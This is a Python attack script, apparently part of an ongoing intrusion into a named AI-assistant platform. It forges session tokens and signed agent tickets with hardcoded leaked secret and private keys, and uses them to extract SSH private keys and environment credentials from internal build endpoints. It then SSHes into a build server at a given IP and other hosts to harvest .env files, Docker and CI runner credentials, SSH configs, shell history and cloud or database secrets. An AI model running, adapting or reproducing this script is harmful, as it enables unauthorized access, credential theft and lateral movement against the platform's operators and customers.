# -*- coding: utf-8 -*-
# intent 29373 v3: fresh env credentials for ALL environments (shared key) -> SSH aro-81 build machine deep harvest + fleet; robust lane (reuse known project conv) + ticket-variant probing
import json,os,sys,base64,re,subprocess,time
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
ENV0="env_GGZoorBKzWbG5Jf5Pxb2Q"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
# known real project conversation (from i28223) as candidate lane
KNOWN_CONV="conv_PtLo6eX4k8LRCFB72DPMo"; KNOWN_ASST="asst_E3G6xx8h7Ei279q6ossJ6"
WORK="/tmp/p29373"; os.makedirs(WORK,exist_ok=True)

def R(k,v,maxb=26000):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def curl(args,timeout=45,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+20)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=12000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:150]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac,hashlib
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
node_sign=r'''
const fs=require('fs'),crypto=require('crypto');
const der=fs.readFileSync(process.argv[2]); const msg=fs.readFileSync(process.argv[3]);
const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});
process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));
'''
open(WORK+"/sign.js","w").write(node_sign)
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    try:
        p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
        return p.stdout.decode().strip()
    except Exception as e:
        return ""
def mint_ticket(agent_id, chat, ttl=7200):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":"dashboard:"+chat.get("conversation_id",""),"turn_id":"","platform":"dashboard",
            "chat_id":chat.get("conversation_id",""),"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat.get("assistant_id",""),"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload)

C=forge_a(AJWT,USER,ORG)
me=call("/api/me",cookie=C); R("me",{"code":me["code"]})

# ---- create runtime ----
rt=call("/api/runtimes","POST",{"name":"pr29373","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt_create",{"code":rt["code"],"rtid":RTID,"agent":RID,"toklen":len(RTOK)})

# ---- determine candidate lanes (chat claims) ----
lanes=[]
# 1) known real project conv
cn=call("/api/conversations/"+KNOWN_CONV,cookie=C,maxlen=4000)
cnj=J(cn) or {}
conv_obj=cnj.get("conversation") if isinstance(cnj,dict) else None
if cn["code"]=="200" and isinstance(conv_obj,dict):
    lanes.append({"tag":"known","conv":conv_obj.get("id") or KNOWN_CONV,"asst":conv_obj.get("assistantId") or KNOWN_ASST,"pid":conv_obj.get("projectId")})
else:
    lanes.append({"tag":"known","conv":KNOWN_CONV,"asst":KNOWN_ASST,"pid":PROJ})
R("lane_known",{"code":cn["code"],"obj":(conv_obj.get("id") if isinstance(conv_obj,dict) else None),"asst":(conv_obj.get("assistantId") if isinstance(conv_obj,dict) else None)})
# 2) discover via list (huge maxlen, parse-able)
convs=J(call("/api/conversations",cookie=C,maxlen=4000000))
cl=convs.get("conversations") if isinstance(convs,dict) else (convs if isinstance(convs,list) else [])
cl=[c for c in cl if isinstance(c,dict)]
for c in cl:
    if c.get("projectId")==PROJ and c.get("id"):
        lanes.append({"tag":"list_proj","conv":c["id"],"asst":c.get("assistantId") or "","pid":PROJ})
R("conv_list_n",{"n":len(cl),"proj":[{"id":c.get("id"),"asst":c.get("assistantId")} for c in cl if c.get("projectId")==PROJ][:8]})
# 3) fabricated
lanes.append({"tag":"fabricated","conv":"conv_0000000000000000000000","asst":"asst_xRouTDbP7tnTvt6aLzkSz","pid":PROJ})
# dedupe
seen=set(); lanes2=[]
for l in lanes:
    if l["conv"] and l["conv"] not in seen:
        seen.add(l["conv"]); lanes2.append(l)
lanes=lanes2
R("lanes",lanes)

# ---- find a working ticket via /internal/build/ssh-keys ----
cur=None
if RID and RTOK:
    for l in lanes:
        chat={"project_id":l["pid"],"conversation_id":l["conv"],"assistant_id":l["asst"],"repo_ids":[]}
        tk=mint_ticket(RID,chat)
        mh={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":tk}
        sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=mh,maxlen=20000)
        R("probe_sshkeys_%s"%l["tag"],{"code":sk["code"],"body":sk["body"][:200]})
        if sk["code"]=="200":
            cur={"lane":l,"ticket":tk,"mh":mh}; break
R("lane_cur",{"ok":bool(cur),"tag":(cur["lane"]["tag"] if cur else None)})

envrecs=[]; keyrecs=[]; credmap=[]
if cur:
    MH=cur["mh"]
    sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=30000)
    SKJ=J(sk) or {}; keys=SKJ.get("ssh_keys") or []
    for k in keys:
        kid=k.get("key_id")
        cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=MH,maxlen=30000)
        cj=J(cr) or {}
        rec={"kid":kid,"name":k.get("name"),"code":cr["code"],"ok":bool(cj.get("private_keys")),"n":len(cj.get("private_keys") or [])}
        keyrecs.append(rec)
        if cj.get("private_keys"):
            fn="pk_%s"%re.sub(r'[^a-zA-Z0-9]','_',kid)
            open(WORK+"/"+fn,"w").write(cj["private_keys"][0]); os.chmod(WORK+"/"+fn,0o600)
            for h in (k.get("hosts") or []):
                if h.get("host"): credmap.append({"host":h["host"],"port":int(h.get("port") or 22),"user":h.get("login_user") or "ubuntu","keyfile":fn,"src":kid})
    R("key_creds",keyrecs)
    acc=call("/internal/build/accounts","POST",{"names":["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII","SSH","LNT"]},hdrs=MH,maxlen=12000)
    R("accounts",{"code":acc["code"],"body":acc["body"][:3000]})
    # all projects (machine headers)
    ipm=call("/internal/projects",cookie=C,hdrs=MH,maxlen=200000)
    IPM=J(ipm) or {}; _pl=IPM.get("projects") if isinstance(IPM,dict) else (IPM if isinstance(IPM,list) else [])
    R("projects_mh",[{"id":(p.get("id") or p.get("projectId")),"name":(p.get("name") or "")[:24]} for p in (_pl or []) if isinstance(p,dict)][:40])
    # ops of our project -> per-env credentials
    opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=400000)) or {}
    envs=opz.get("environments") or []
    R("envs_meta",[{"key":e.get("key"),"name":e.get("name"),"host":(e.get("sshKey") or {}).get("host"),"port":(e.get("sshKey") or {}).get("port"),"user":(e.get("sshKey") or {}).get("loginUser"),"root":(e.get("sshKey") or {}).get("remoteRoot")} for e in envs])
    for e in envs:
        eid=e.get("id")
        cr=call("/internal/build/credential","POST",{"environment_id":eid,"purpose":"ssh_agent"},hdrs=MH,maxlen=30000)
        cj=J(cr) or {}
        rec={"env":e.get("key"),"code":cr["code"],"host":cj.get("host"),"port":cj.get("port"),"user":cj.get("login_user"),"root":cj.get("remote_root"),"has_key":bool(cj.get("private_key"))}
        if cj.get("message"): rec["msg"]=cj["message"][:120]
        envrecs.append(rec)
        if cj.get("private_key"):
            fn="ek_%s"%re.sub(r'[^a-zA-Z0-9]','_',e.get("key") or eid)
            open(WORK+"/"+fn,"w").write(cj["private_key"]); os.chmod(WORK+"/"+fn,0o600)
            credmap.append({"host":cj.get("host"),"port":int(cj.get("port") or 22),"user":cj.get("login_user") or "ubuntu","keyfile":fn,"src":e.get("key")})
    R("env_creds",envrecs)
    seen=set(); cm=[]
    def rank(t):
        r=0
        if t["host"]=="81.68.254.22": r-=100
        if str(t["keyfile"]).startswith("ek_"): r-=10
        return r
    for t in sorted(credmap,key=rank):
        sig=(t["host"],t["port"],t["user"],t["keyfile"])
        if sig in seen: continue
        seen.add(sig); cm.append(t)
    R("credmap",cm[:40])
    HARVB=r'''id; hostname; uname -a; echo ===SUDO; sudo -n true 2>&1 && echo SUDO_OK || echo NO_SUDO
echo ===OPT; ls -la /opt /opt/src 2>&1 | head -60
echo ===ENVF; for f in /opt/src/.env.dev /opt/src/.env /opt/src/.env.prod /opt/src/.env.local /opt/.env.dev /opt/src/dev_ops/.env; do echo "--$f--"; cat "$f" 2>/dev/null | head -c 4000; done
echo ===FIND; find /opt/src -maxdepth 4 \( -name '.env*' -o -name '*.pem' -o -name '*.key' -o -name 'config.json' -o -name '.git-credentials' -o -name '*.token' -o -name 'id_*' \) 2>/dev/null | head -50
echo ===GIT; cd /opt/src 2>/dev/null && git remote -v 2>/dev/null | head; cd /opt/src 2>/dev/null && git log --oneline -3 2>/dev/null
echo ===DOCKER; cat ~/.docker/config.json /etc/docker/daemon.json /root/.docker/config.json 2>/dev/null | head -c 2000
echo ===GH; env | grep -Ei 'GITHUB|GH_|RUNNER|TOKEN|_CI' | head -40; find / -maxdepth 5 \( -path '*actions-runner*.runner' -o -path '*actions-runner*.credentials*' \) 2>/dev/null | head; ls -la /opt/actions-runner ~/actions-runner /home/*/actions-runner 2>/dev/null | head -30
echo ===SSH; ls -la ~/.ssh /root/.ssh 2>/dev/null; cat ~/.ssh/config /root/.ssh/config 2>/dev/null
echo ===HIST; tail -60 ~/.bash_history /root/.bash_history 2>/dev/null
echo ===GREP; grep -rIl -m1 -Ei 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloudflared|rathole|TENCENTCLOUD|AWS_SECRET|LTAI[A-Za-z0-9]|postgres://|mysql://' /opt/src /opt /home /etc 2>/dev/null | head -25
echo ===ENVGREP; (set -a; . /opt/src/.env.dev 2>/dev/null; . /opt/src/.env 2>/dev/null; env | grep -Ei 'secret|token|pass|key|dsn|database|zoofi|lumii|aws|aliyun|tencent|cos_|docker|registry' | head -80)
echo END'''
    HARVG=r'''id; hostname; echo ===SUDO; sudo -n true 2>&1 && echo SUDO_OK || echo NO_SUDO
echo ===ENVF; for f in /opt/lumii-prod/.env.dev /opt/lumii-stage/.env.dev /opt/lumii-prod/.env /opt/src/.env.dev; do echo "--$f--"; cat "$f" 2>/dev/null | head -c 3500; done
echo ===LS; ls -la ~ /opt ~/.ssh 2>&1 | head -60
echo ===DOCKER; cat ~/.docker/config.json /etc/docker/daemon.json 2>/dev/null | head -c 1500
echo ===GREP; grep -rIl -m1 -Ei 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloudflared|rathole|TENCENTCLOUD|AWS_SECRET|LTAI[A-Za-z0-9]' /opt /home /etc 2>/dev/null | head -15
echo END'''
    def ssh_run(host,port,user,kf,cmd,tmo=50):
        path=os.path.join(WORK,kf)
        if not os.path.exists(path): return {"rc":-99,"out":"","err":"nokey"}
        try:
            p=subprocess.run(["ssh","-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
                 "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes",
                 "%s@%s"%(user,host),cmd],capture_output=True,timeout=tmo)
            return {"rc":p.returncode,"out":p.stdout.decode("utf-8","replace")[:16000],"err":p.stderr.decode("utf-8","replace")[-260:]}
        except Exception as e:
            return {"rc":-1,"out":"","err":repr(e)[:200]}
    sshsum=[]
    for t in cm[:24]:
        host=t["host"]; port=t["port"]; user=t["user"]; kf=t["keyfile"]
        isbuild=(host=="81.68.254.22")
        res=ssh_run(host,port,user,kf,HARVB if isbuild else HARVG)
        R("s_%s_%s_%s"%(host,user,kf),{"rc":res["rc"],"out":res["out"],"err":res["err"],"src":t["src"]})
        sshsum.append({"host":host,"port":port,"user":user,"key":kf,"src":t["src"],"rc":res["rc"],"ok":bool(res["out"].strip())})
        time.sleep(0.3)
    R("ssh_summary",sshsum)
else:
    R("fatal",{"rid":RID,"tok":bool(RTOK),"lanes":lanes})

# ---- cleanup: only my runtime ----
def dele(path):
    r=call(path,method="DELETE",cookie=C,maxlen=500); return {"path":path,"code":r["code"]}
R("cleanup",[dele("/api/runtimes/"+RTID)] if RTID else [])
R("done",{"t":int(time.time())})
